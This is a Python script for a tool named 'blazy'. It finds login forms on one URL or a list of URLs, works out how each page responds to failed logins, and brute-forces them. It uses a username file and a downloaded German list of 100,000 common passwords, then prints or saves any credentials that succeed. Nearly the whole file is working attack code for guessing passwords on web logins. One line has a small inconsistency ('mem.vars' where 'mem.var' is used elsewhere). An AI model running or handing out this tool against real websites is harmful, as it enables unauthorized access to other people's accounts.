import re
import sys
import argparse
import requests
import core.config as mem
from core.output import json_output
from core.requester import requester
from urllib.parse import urlparse
from core.anamoly import define, compare
from core.parser import get_login_form
from core.utils import prepare_request, identify_fields

from core.colors import green, end

parser = argparse.ArgumentParser()
parser.add_argument('-i', help='all kind of input', dest='input')
parser.add_argument('-oJ', help='all kind of input', dest='json_output')
parser.add_argument('-t', help='http timeout', dest='timeout', default=10)

args = parser.parse_args()
mem.var = vars(args)

print("\n    blazy 0.2.0\n")

usernames = []
passwords = []

def gen_payload(username, password, location, inputs):
    payload = {}
    for input_obj in inputs:
        if input_obj['name'] == location['password']:
            payload[input_obj['name']] = password
        elif input_obj['name'] == location['username']:
            payload[input_obj['name']] = username
        else:
            payload[input_obj['name']] = input_obj['value']
    payload['form'] = 'submit'
    return payload

def bruteforce(url, inputs, locations, factors):
    for user in usernames:
        for password in passwords:
            payload = gen_payload(user, password, locations, inputs)
            response = requester(url, payload)
            if compare(response, factors) != "":
                return user, password, payload
    return user, password, payload

def process_url(url):
    html = requester(url).text
    login_form = get_login_form(html)

    if not login_form:
        return '', '', ''

    full_url = prepare_request(url, login_form)
    locations = identify_fields(login_form['inputs'])
    factors = define(requester(full_url, gen_payload("dummyuser", "dummypass", locations, login_form['inputs'])).text,
                     requester(full_url, gen_payload("dummyuser2", "dummypass2", locations, login_form['inputs'])).text)

    return bruteforce(full_url, login_form['inputs'], locations, factors)

def init_db():
    global passwords
    password_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-100000.txt"
    response = requests.get(password_url)
    passwords = response.text.splitlines()

    with open('./db/usernames.txt', 'r') as usernames_file:
        for line in usernames_file:
            usernames.append(line.rstrip('\n'))

def main():
    init_db()
    if re.search("^https?://", mem.var['input']):
        username, password, result = process_url(mem.var['input'])
        if mem.var['json_output']:
            output = json_output(result)
            if mem.vars['json_output'] == '-':
                print(output)
                quit()
            with open(mem.var['json_output'], 'a+') as json_file:
                json_file.write(output + "\n")
    else:
        with open(mem.var['input'], 'r') as url_file:
            count = 0
            for line in url_file:
                count += 1
                print("Progress: %i" % count, end="\r")
                url = line.rstrip('\n')
                if re.search("^https?://", url):
                    username, password, result = process_url(url)
                    if not username:
                        continue
                    if mem.var['json_output']:
                        output = json_output(result)
                        if mem.var['json_output'] == '-':
                            print(output)
                            quit()
                        with open(mem.var['json_output'], 'a+') as json_file:
                            json_file.write(output + "\n")
                    else:
                        print("%s>>%s %s" % (green, end, url))
                        print("  %suser:%s %s" % (green, end, username))
                        print("  %spass:%s %s" % (green, end, password))

if __name__ == '__main__':
    main()
